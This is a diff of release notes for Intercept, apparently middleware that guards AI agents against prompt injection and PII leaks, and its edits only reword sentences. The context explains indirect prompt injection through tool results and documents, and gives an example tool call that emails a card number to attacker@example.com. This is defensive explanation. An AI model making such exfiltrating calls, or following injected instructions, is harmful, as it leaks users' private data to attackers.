@@ -80,7 +80,7 @@ description: "Product updates and release notes for Intercept, including depende
 
     Intercept has always inspected what goes *out*. It never saw what comes back in. Tool results, retrieved documents, and conversation history do not pass through the middleware pipeline, and that is exactly where indirect prompt injection lives.
 
-    When an agent is manipulated by content Intercept never saw, the damage almost always surfaces as a tool call:
+    When content that Intercept never saw manipulates an agent, the damage almost always surfaces as a tool call:
 
     ```text
     send_email(to: "attacker@example.com", body: "card 4111111111111111")
@@ -152,7 +152,7 @@ description: "Product updates and release notes for Intercept, including depende
     - logged
     - blocked
 
-    Documentation has also been updated to include the new supported entity type and usage examples.
+    Also updated the documentation to include the new supported entity type and usage examples.
 </Update>
 
 <Update label="July 16, 2026" description="v0.1.6" tags={["Release", "PII Redaction"]}>
@@ -165,7 +165,7 @@ description: "Product updates and release notes for Intercept, including depende
     - logged
     - blocked
 
-    Documentation has also been updated to include the new supported entity type and usage examples.
+    Also updated the documentation to include the new supported entity type and usage examples.
 </Update>
 
 <Update label="July 14, 2026" description="v0.1.5" tags={["Release", "Security", "Community"]}>
@@ -182,7 +182,7 @@ description: "Product updates and release notes for Intercept, including depende
     - `PromptInjectionGuardException`
     - `PIIRedactorException`
 
-    This lets applications catch one shared Intercept exception when they want simpler error handling, while still keeping middleware-specific exceptions available for more granular control.
+    This lets you catch one shared Intercept exception for simpler error handling. Middleware-specific exceptions remain available for more granular control.
 
     Also added documentation for handling blocked prompts and improved the release title generation used across repositories.
 </Update>
